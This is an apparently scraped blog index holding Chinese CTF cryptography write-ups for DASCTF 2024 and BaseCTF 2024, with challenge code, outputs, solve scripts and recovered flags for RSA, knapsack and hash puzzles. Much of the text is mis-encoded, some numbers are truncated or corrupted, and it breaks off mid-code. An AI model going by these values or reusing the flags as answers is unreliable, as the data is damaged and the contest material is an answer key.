æ„Ÿè§‰è¿™æ˜¯æ‰“çš„æœ€æœ‰æ„æ€çš„ä¸€æ¬¡æ¯”èµ›äº†ï¼Œå½“æ—¶åœ¨ç«è½¦ç«™æ‰“å¼€ç”µè„‘å†™çš„ï¼Œç§’äº†ä¸€é¢˜ï¼Œç„¶åä¸Šç«è½¦äº†ï¼Œä¸€è·¯å¾ˆé¢ å°±æ²¡æœ‰å†å†™äº†ï¼Œå¤ç°ä¸€ä¸‹å‰ä¸‰é¢˜ ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:1:0","tags":["crypto"],"title":"2024DASCTFæš‘æœŸâ€”Cryptoå¤ç°","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:2:0","tags":["crypto"],"title":"2024DASCTFæš‘æœŸâ€”Cryptoå¤ç°","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"complex_enc task from Crypto.Util.number import * import random from secret import flag def GET_KEY(n): sum=2 key=[1] for i in range(n): r=random.randint(0,1) x=sum+random.randint(0,n)*r key.append(x) sum+=x return key def enc(m,k): cipher_list = [] for i in range(len(m)): if m[i] == 1: cipher_list.append(m[i] * k[i]) cipher = sum(cipher_list) return cipher m=bytes_to_long(flag) m = [int(bit) for byte in flag for bit in format(byte, '08b')] key=GET_KEY(len(m)) c=enc(m,key) with open('output.txt', 'w') as f: f.write(str(c)) f.write(str(key)) output 287687761937146187597379915545639385740275457170939564210821293233370716878150576 [1, 2, 87, 99, 190, 380, 760, 1702, 3350, 6712, 13302, 26669, 53257, 106512, 213212, 426262, 852583, 1705083, 3410164, 6820581, 13640909, 27281818, 54563749, 109127508, 218254958, 436509851, 873019897, 1746039768, 3492079367, 6984158992, 13968317822, 27936635563, 55873271257, 111746542368, 223493084736, 446986169472, 893972338944, 1787944677888, 3575889355776, 7151778711750, 14303557423366, 28607114846668, 57214229693336, 114428459386792, 228856918773559, 457713837547023, 915427675094046, 1830855350188252, 3661710700376344, 7323421400752912, 14646842801505675, 29293685603011275, 58587371206022773, 117174742412045483, 234349484824090806, 468698969648181659, 937397939296363271, 1874795878592726601, 3749591757185453143, 7499183514370906547, 14998367028741812852, 29996734057483625898, 59993468114967251756, 119986936229934503501, 239973872459869007099, 479947744919738013939, 959895489839476027878, 1919790979678952055983, 3839581959357904111739, 7679163918715808223719, 15358327837431616447319, 30716655674863232894717, 61433311349726465789458, 122866622699452931578804, 245733245398905863157495, 491466490797811726314990, 982932981595623452629980, 1965865963191246905260222, 3931731926382493810520182, 7863463852764987621040623, 15726927705529975242080987, 31453855411059950484161974, 62907710822119900968323970, 125815421644239801936647918, 251630843288479603873295836, 503261686576959207746591710, 1006523373153918415493183613, 2013046746307836830986367190, 4026093492615673661972734253, 8052186985231347323945468456, 16104373970462694647890936894, 32208747940925389295781874025, 64417495881850778591563748059, 128834991763701557183127495888, 257669983527403114366254991760, 515339967054806228732509983520, 1030679934109612457465019967093, 2061359868219224914930039934133, 4122719736438449829860079868450, 8245439472876899659720159736935, 16490878945753799319440319473651, 32981757891507598638880638947330, 65963515783015197277761277894728, 131927031566030394555522555789579, 263854063132060789111045111579109, 527708126264121578222090223158048, 1055416252528243156444180446316096, 2110832505056486312888360892632193, 4221665010112972625776721785264450, 8443330020225945251553443570528835, 16886660040451890503106887141057670, 33773320080903781006213774282115477, 67546640161807562012427548564230882, 135093280323615124024855097128461699, 270186560647230248049710194256923398, 540373121294460496099420388513846796, 1080746242588920992198840777027693592, 2161492485177841984397681554055387246, 4322984970355683968795363108110774528, 8645969940711367937590726216221549105, 17291939881422735875181452432443098117, 34583879762845471750362904864886196180, 69167759525690943500725809729772392360, 138335519051381887001451619459544784838, 276671038102763774002903238919089569616, 553342076205527548005806477838179139174, 1106684152411055096011612955676358278348, 2213368304822110192023225911352716556750, 4426736609644220384046451822705433113446, 8853473219288440768092903645410866226907, 17706946438576881536185807290821732453830, 35413892877153763072371614581643464907890, 70827785754307526144743229163286929815519, 141655571508615052289486458326573859631099, 283311143017230104578972916653147719262229, 566622286034460209157945833306295438524626, 1133244572068920418315891666612590877049074, 2266489144137840836631783333225181754098066, 45329782882756816732","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:2:1","tags":["crypto"],"title":"2024DASCTFæš‘æœŸâ€”Cryptoå¤ç°","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"1z_RSA task from Crypto.Util.number import * from sympy import * import os from secrets import flag nbit =130 e = 3 l = getPrime(505) m = bytes_to_long(flag + os.urandom(64)) assert len(flag) == 29 while True: p, q = getPrime(nbit), getPrime(nbit) PQ = int(str(p\u003c\u003c120)+str(q)) QP = int(str(q\u003c\u003c120)+str(p)) if isPrime(PQ) and isPrime(QP): break n = PQ * QP PP = nextprime((PQ \u003e\u003e 190) * (QP \u0026 (2 ** 190 - 1))) QQ = nextprime((QP \u003e\u003e 190) * (PQ \u0026 (2 ** 190 - 1))) N = PP * QQ M = pow(m,1,l) c = pow(m,e,N) print('n =', n) print('M =', M) print('l =', l) print('c =', c) ''' n = 18339446336492672809908730785358232636383625709800392830207979464962269419140428722248172110017576390002616004691759163126532392634394976712779777822451878822759056304050545622761060245812934467784888422790178920804822224673755691 M = 36208281423355218604990190624029584747447986456188203264389519699277658026754156377638444926063784368328407938562964768329134840563331354924365667733322 l = 56911058350450672322326236658556745353275014753768458552003425206272938093282425278193278997347671093622024933189270932102361261551908054703317369295189 c = 720286366572443009268610917990845759123049408295363966717060100862857351750759651979922104897091176824666482923148635058966589592286465060161271579501861264957611980854954664798904862706450723639237791023808177615189976108231923 ''' æ€è·¯ å½“æ—¶çš„æƒ³æ³•æ˜¯æƒ³èµ·æ¥äº†ä¸€ä¸ªå¾ˆç±»ä¼¼çš„é¢˜ï¼Œå«åš[EIS 2019]rsa1ï¼Œç„¶åå‘ç°ä¸ä¸€æ ·ï¼Œè‰äº†ï¼Œ $$ n=PQ * QP =(p\\times2^{120}\\times10^{39}+q)\\times (q\\times2^{120}\\times10^{39}+p) =p \\times q \\times 2^{240} \\times 10^{39*2} +p^2 \\times 2^{120} \\times 10^{39}+q^2 \\times 2^{120} \\times 10^{39}+p \\times q $$ æ‰€ä»¥pqä½ä½å°±æ˜¯ $$ n \\bmod 2^{120} \\times 10^{39} $$ é«˜ä½æ˜¯ $$ \\frac{n}{2^{360} 10^{39\\times3}} $$ å› ä¸ºpï¼Œqæœ‰å¤§å°è¯¯å·®ï¼Œå†é™¤ä»¥ä¸ª10å·¦å³ï¼Œä¹‹åå°±æ˜¯å¸¸è§çš„e,phiä¸äº’ç´ ï¼Œç„¶åcrt from Crypto.Util.number import * import sympy from sympy.abc import x, y, z n = 18339446336492672809908730785358232636383625709800392830207979464962269419140428722248172110017576390002616004691759163126532392634394976712779777822451878822759056304050545622761060245812934467784888422790178920804822224673755691 M = 362082814233552186049901906240295847474479864. 56188203264389519699277658026754156377638444926063784368328407938562964768329134840563331354924365667733322 l = 56911058350450672322326236658556745353275014753768458552003425206272938093282425278193278997347671093622024933189270932102361261551908054703317369295189 c = 720286366572443009268610917990845759123049408295363966717060100862857351750759651979922104897091176824666482923148635058966589592286465060161271579501861264957611980854954664798904862706450723639237791023808177615189976108231923 p_q_l = n % (2**120 * 10**39) p_q_h = n // (2**360 * 10 ** (39 * 3)) // 10 pq = p_q_h * (2**120 * 10**39) + p_q_l a = sympy.solve( [x * y - pq, (x * 2**120 * 10**40 + y) * (y * 2**120 * 10**39 + x) - n], [x, y] ) p, q = a[1] print(p) print(q) #sage from Crypto.Util.number import * p=855604426214387476576649090490109822073 q=1213149261930568621267125437333569321667 PQ = int(str(p\u003c\u003c120)+str(q)) QP = int(str(q\u003c\u003c120)+str(p)) PP = next_prime((PQ \u003e\u003e 190) * (QP \u0026 (2**190 - 1))) QQ = next_prime((QP \u003e\u003e 190) * (PQ \u0026 (2**190 - 1))) for mp in GF(PP)(c).nth_root(3, all=True): for mq in GF(QQ)(c).nth_root(3, all=True): m = crt([ZZ(mp), ZZ(mq)], [PP, QQ]) mm = crt([m,M],[PP*QQ,l]) print(long_to_bytes(int(mm))) #b'DASCTF{Ar3_Y0u_Su93_Abt139??}' ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:2:2","tags":["crypto"],"title":"2024DASCTFæš‘æœŸâ€”Cryptoå¤ç°","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"found task from Crypto.Util.number import * from random import * from secret import flag from sympy import * bits = 1024 l = 138833858362699289505402947409766595473722379891580589518174731439613184249727659678966809301611194545239974736175752769503863392697421092435438747741790652435801956708356186578269272819715592752821497122516109657809748674185639254430403157877064556216401002688452227124543508128414591884297632663910714681207 assert isPrime(l) def generate_prime(bits): return randprime(2**(bits-1), 2**bits) def fun(data,y,n): return sum([data[i] * pow(y,i,n) for i in range(len(data))]) % n def gen(x, y, z, w, n): data = [randint(n // 4, n) for _ in range(10)] leak1 = pow(x + pow(y, z, n), w, n) leak2 = fun(data, y, n) return data, leak1, leak2 def encrypt(l,m,n): mm = bin(m)[2:].zfill((m.bit_length() // 8 + 1) * 8) length = len(mm) c = [] s = [] for i in range(length): a = randint(1, n) s.append(pow(a, length, n)) for j in range(length): c.append(pow(l,int(mm[j]),n) * s[j] % n) return c p, q = [generate_prime(bits) for _ in range(2)] r = generate_prime(bits // 4) n = p ** 2 * q * r e1 = generate_prime(128) e2 = generate_prime(128) phi1 = p * (p - 1) * (q - 1) * (r - 1) phi2 = (p - 1) * (p - 2) * (q - 2) * (r - 2) d1 = inverse(e1, phi1) d2 = inverse(e2, phi2) t = getRandomRange(n // 4, n) data, leak1, leak2 = gen(r, t, e1, d1, n) m = bytes_to_long(flag) c = encrypt(l, m, n) with open('output.txt','w') as f: f.write(f'n = {n}\\n') f.write(f'e1 = {e1}\\n') f.write(f'ed = {e2 * d2}\\n') f.write(f'data = {data}\\n') f.write(f'leak1 = {leak1}\\n') f.write(f'leak2 = {leak2}\\n') f.write(f'c = {c}') output å¤ªé•¿äº†ï¼Œä¸æ”¾è¿™é‡Œ æ€è·¯ æ±‚è§£p ä»£ç åˆè‡­åˆé•¿ï¼Œè§‚å¯Ÿä»£ç å¯ä»¥å‘ç° $$ e_2å’Œphi_2 $$å¯ä»¥ç›´æ¥ç”¨æ¥æ±‚è§£ã€‚ $$ e_2d_2=1+(p-1)(p-2)(q-2)(r-2)$$ æœ‰ $$ e_2d_2-1=k(p-1) $$ å† $$ 2^{e_2d_2}-2 \\equiv 2^{k(p-1)} \\bmod p $$ é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è´¹é©¬å°å®šç†å’Œgcdæ±‚è§£p å³ $$ p=\\gcd(2^{e_2d_2}-2 \\bmod n,2) $$ å³ $$ p=\\gcd(pow(2,e_2d_2-1,n)-1,n) $$æ±‚è§£flag mmå°±æ˜¯mè½¬æˆäºŒè¿›åˆ¶ï¼Œé•¿åº¦æ˜¯lengthï¼ˆç”¨tè¡¨ç¤ºï¼‰ï¼Œç”Ÿæˆäº†ä¸€ä¸ªéšæœºåˆ—è¡¨sï¼Œ $$s=a^t ï¼Œaä¸ºéšæœºæ•°$$,ç„¶ååœ¨é€ä½åŠ å¯†ï¼Œè‹¥ä¸º0ï¼Œåˆ™ä¸ºsï¼Œå¦åˆ™ä¸ºlsï¼Œå…¶ä¸­læ˜¯ä¸€ä¸ªå›ºå®šæ•°å­—ï¼Œä¸”ä¸æ˜¯mod pæƒ…å†µä¸‹çš„äºŒæ¬¡å‰©ä½™ï¼Œä½†æ˜¯tä¸ºå¶æ•°ï¼Œé‚£ä¹ˆsä¸ºäºŒæ¬¡å‰©ä½™ï¼Œæ‰€ä»¥æ¯ä¸€ä½å»è¿˜åŸåˆ¤æ–­æ˜¯å¦ä¸ºäºŒæ¬¡å‰©ä½™å³å¯ exp from Crypto.Util.number import * #æ•°æ® p = GCD(pow(2,ed-1,n)-1,n) flag = \"\" for i in range(len(c)): if(pow(c[i],(p-1)//2,p) == 1): flag += \"0\" else: flag += \"1\" print(long_to_bytes(int(flag,2))) ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:2:3","tags":["crypto"],"title":"2024DASCTFæš‘æœŸâ€”Cryptoå¤ç°","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"æ€»ç»“ æœ€åä¸¤é“é¢˜éƒ½æ˜¯æ ¼äº†ï¼Œæ˜¯æˆ‘çš„æœªçŸ¥é¢†åŸŸï¼Œå°±ä¸å†™äº†ï¼Œçœ‹åˆ«äººçš„wpä¹Ÿæ˜¯ä¸€è„¸æ‡µé€¼ï¼Œè‡ªå·±è¿˜æ˜¯éœ€è¦åŠªåŠ›è¿½èµ¶åˆ«äººçš„æ­¥ä¼ï¼Œä¸èƒ½è¢«è½ä¸‹å¤ªå¤šã€‚ ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:3:0","tags":["crypto"],"title":"2024DASCTFæš‘æœŸâ€”Cryptoå¤ç°","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"week1ã®é¢˜ç›® ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ä½ ä¼šç®—MDå— task import hashlib flag='BaseCTF{}' output=[] for i in flag: my_md5=hashlib.md5() my_md5.update(i.encode()) output.append(my_md5.hexdigest()) print(\"output =\",output) ''' output = ['9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf'] ''' æ€è·¯ï¼šç›´æ¥åˆ©ç”¨å“ˆå¸Œè¡¨å»æ‰¾å­—ç¬¦ä¸²å°±è¡Œäº† exp import hashlib chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^\u0026*()-_=+[]{}|;:,.\u003c\u003e?/~`' hash_to_char = {} for char in chars: md5_hash = hashlib.md5(char.encode()).hexdigest() hash_to_char[md5_hash] = char hashes = ['9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf'] # æ¢å¤ flag flag = ''.join(hash_to_char.get(h, '?') for h in hashes) print(\"æ¢å¤çš„ flag =\", flag) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"åä¸ƒå€ task #include \u003cstdio.h\u003e int main() { unsigned char flag[] = \"BaseCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"; int i; for (i = 0; i \u003c 40; i++) { flag[i] = flag[i] * 17; } if (flag[0] != 98) { /* ï¿½Â±ï¿½ï¿½Ç´ï¿½ 0 ï¿½ï¿½Ê¼ï¿½ï¿½ */ printf(\"CPU Error???\\n\"); return 1; } unsigned char cipher[] = { 98, 113, 163, 181, 115, 148, 166, 43, 9, 95, 165, 146, 79, 115, 146, 233, 112, 180, 48, 79, 65, 181, 113, 146, 46, 249, 78, 183, 79, 133, 180, 113, 146, 148, 163, 79, 78, 48, 231, 77 }; for (i = 0; i \u003c 40; i++) { if (flag[i] != cipher[i]) { printf(\"flag[%d] is wrong, expect %d, got %d.\\n\", i, cipher[i], flag[i]); return 1; } } return 0; } æ€è·¯ï¼šæœ‰ç‚¹åƒé€†å‘ï¼Œflag[i] è¢«ä¹˜ä»¥ 17 å¾—åˆ° cipher[i]ã€‚ å› ä¸º flag[i] æ˜¯ unsigned char ç±»å‹ï¼Œæ‰€ä»¥å®é™…è®¡ç®—æ—¶ä¼šå¯¹ 256 å–æ¨¡ã€‚ ä¸ºäº†è¿˜åŸ flagï¼Œæˆ‘ä»¬éœ€è¦å¯¹ cipher[i] é™¤ä»¥ 17ï¼Œç„¶åå¯¹ç»“æœå–æ¨¡ 256ã€‚ exp cipher = [ 98, 113, 163, 181, 115, 148, 166, 43, 9, 95, 165, 146, 79, 115, 146, 233, 112, 180, 48, 79, 65, 181, 113, 146, 46, 249, 78, 183, 79, 133, 180, 113, 146, 148, 163, 79, 78, 48, 231, 77 ] flag = [(x * pow(17, -1, 256)) % 256 for x in cipher] flag_str = bytes(flag).decode('ascii') print(flag_str) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"babypack tsak from Crypto.Util.number import * import random flag=b'BaseCTF{}' m=bytes_to_long(flag) bin_m=bin(m)[2:] length=len(bin_m) a=[1] sum=1 for i in range(length-1): temp=random.randint(2*sum+1,4*sum) sum=sum+temp a.append(temp) a=a[::-1] c=0 for i in range(length): if bin_m[i]=='1': c=c+a[i] print(\"a=\",a) print(\"c=\",c) a= [2487264674516612702148381262059366937897201508455413114345031288894980789076145147579418259432661232747375904997965581530362268904008339124626472045717075482791021095030019783589425299870946373246221582957232862473515, 491733695728183987781854883946776199363545034763223630648303216239781071808983441788738994635864262288104702316190256147614095355462666760091586746521889127102395089946736744234701020777747486645716679961505355358205, 110323038758283816811655397189354730775114318542406507944678995133064353922234139010858233544980338693080719766808774615216332973443076471838385315798081800456260331047745824029902641504699030254172864776140503685719, 21329601123439484788549839891633989762344638209267595412456647269024794605613697213699096256470155035750114059504925376661660484839061252258268241386676023785213539005867805566800471943519247336183762390966700950019, 7146972597944713271040951137457604863561388249875746261956055482229418349264570561740906104126974792505856583850338097727129246644471065603435449813884941071413766137227119139128098345457922432088128969598942863267, 1346101131622672931978096423414991055086097907048045187836881598919564312718270178534519827267497280433625574785132174894812908583233359458000469975702103413693480199742325839719191134247009906270778775450756715188, 431832097768527518676165198802192386603746291434967601504548859319580699889723090943427634867984592194172569910901514799190511020246917662162535632202054961537707269684557393598823535364874075052250490284484829188, 140385263282271996264759155211641776877746297983736897311922733831813190094504225023609340831846735540994403916688230922925129855025970272950216444321463493579227283703118512150491635819942098587286980862817753505, 34223371325515207445588748757581712557393912157235932688701226001484995652561037930828670928779595410194265999875772181711329727812185265441887453894003309876654082495957062628413923487565276953961953102939899664, 11277905223110088306111589808536546872836546320235997789453098291242971723694602770076671423955063276020078678714571127064308764611705435202479293805661470178917099557275252963592432838615626750886647727435412727, 2615533435460831263145388899927800470846179005257762751742107113431800042995970550154282940437470113325491219189765587324789634252029440596113709555932091761129000675863727140738692649309833681187804499985953136, 936680841170458882946412959909966575946011948314629933325082014426837165501136249855420901858482634295013806361789689361684904674438042695516337484436348646919308417999556756779144910987756875858573687134864914, 240803995584844951172124454225548986410808735949094019867567366838810221297826531921690948148961695516283629928962961745839887826049348862278548294987215333063020792491250359616172365439958324315638641990190536, 74980313650452416147684959971591530004150916322659108850519926847892455755211157414650129501071119906261853154503022754482691495645170933619292755026582075009055897885581671027043347130782615603358690889357969, 17373734350550516610959609643239951947839958095899981508834140825450716407631617618229082722622331706459216379319570540046133821392793975119423828799726656124807834541043219269949459907314628636546219059231483, 4383939698435145446949414991318424065438281430941348230548310095735465803169460840233678696507780083107318568406471009158126616954496458697727524252433591785759305622568557705826283690985480130620325779855269, 1070435075033499499988967771003353861621342562651011567215908784740129578236135452228720299864117045007232989018924013752836270314752592099997410344317383430641687448457000377071747633795773722163076615405153, 3546130243995132911500239","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"babyrsa task from Crypto.Util.number import * flag=b'BaseCTF{}' m=bytes_to_long(flag) n=getPrime(1024) e=65537 c=pow(m,e,n) print(\"n =\",n) print(\"e =\",e) print(\"c =\",c) \"\"\" n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323 e = 65537 c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832 \"\"\" æ€è·¯ï¼šnä¸ºç´ æ•°ï¼Œç›´æ¥å¯¹næ±‚phiæ±‚è§£ exp n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323 e = 65537 c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832 from Crypto.Util.number import * phi=n-1 d=inverse(e,phi) m=pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:4","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ez_math task import numpy as np from Crypto.Util.number import * a, b, c, d = [getPrime(128) for _ in range(4)] point1 = a * d point2 = b * c matrix2 = [[0, a, b], [0, c, d]] flag = b\"flag{test_flag}\" flag = bytes_to_long(flag) def randomArray(): upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] low = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] for i in range(3): for j in range(i+1, 3): upper[i][j] = getPrime(128) low[j][i] = getPrime(128) result = np.array(upper) @ np.array(low) return result A = np.array([[flag, 0, 0]] + matrix2) B = randomArray() MAT = A @ B print(point1) print(point2) print(MAT) ''' 85763755029292607594055805804755756282473763031524911851356658672180185707477 70470862191594893036733540494554536608294230603070251013536189798304544579643 [[73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245 46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830 161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185] [13874395612510317401724273626815493897470313869776776437748145979913315379889260408106588331541371806148807844847909 17025249852164087827929313934411832021160463738288565876371918871371314930048841650464137478757581505369909723030523 59510107422473463833740668736202898422777415868238817665123293560097821015330] [11314088133820151155755028207579196628679021106024798818326096960197933616112389017957501267749946871903275867785729 13883500421020573457778249958402264688539607625195400103961001780695107955462968883861677871644577542226749179056659 48528427402189936709203219516777784993195743269405968907408051071264464132448]] ''' æ€è·¯ï¼š 1.éé¢„æœŸç›´æ¥ä¹˜å¼€ï¼Œå¯ä»¥å‘ç°çŸ©é˜µä¸­flagä¸ºå…¬å› å­ï¼Œç›´æ¥GCD import numpy as np from Crypto.Util.number import GCD, long_to_bytes MAT = np.array([ [73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245, 46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830, 161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185], [13874395612510317401724273626815493897470313869776776437748145979913315379889260408106588331541371806148807844847909, 17025249852164087827929313934411832021160463738288565876371918871371314930048841650464137478757581505369909723030523, 59510107422473463833740668736202898422777415868238817665123293560097821015330], [11314088133820151155755028207579196628679021106024798818326096960197933616112389017957501267749946871903275867785729, 13883500421020573457778249958402264688539607625195400103961001780695107955462968883861677871644577542226749179056659, 48528427402189936709203219516777784993195743269405968907408051071264464132448] ]) flag = GCD(MAT[0, 0], MAT[0, 1], MAT[0, 2]) print(long_to_bytes(flag)) 2.é¢„æœŸåšæ³•ï¼šåˆ©ç”¨çŸ©é˜µçš„æ€§è´¨ï¼ŒçŸ©é˜µAè®¡ç®—è¡Œåˆ—å¼å°±æ˜¯flag*(ad-bc) import sympy as sp from Crypto.Util.number import * # å®šä¹‰çŸ©é˜µ c = sp.Matrix([ [73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245, 46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830, 161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185], [138743956125103174017242736268154938974703138697767764377481459799133153798892604081065883315413718061","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:1:5","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"mid_math task import numpy as np from Crypto.Util.number import * a, b, c, d = [getPrime(128) for _ in range(4)] point1 = a * d point2 = b * c matrix2 = [[0, a, b], [0, c, d]] flag = b\"flag{test_flag}\" flag = bytes_to_long(flag) def randomArray(): upper = [[1, 0, 0], [0, 1, 0], [0, 0, 1]] low = [[1, 0, 